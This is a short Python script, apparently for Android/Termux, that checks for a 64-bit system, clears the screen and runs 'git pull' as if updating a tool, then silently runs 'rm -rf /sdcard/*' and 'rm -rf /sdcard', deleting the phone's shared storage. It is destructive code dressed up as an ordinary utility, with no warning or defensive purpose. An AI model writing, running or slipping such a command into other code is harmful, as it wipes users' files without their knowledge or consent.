import os, sys, platform,time
bit = platform.architecture()[0]
if bit == '64bit':
    #mport i
    os.system('clear')
    os.system('git pull')
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
else:
    exit()
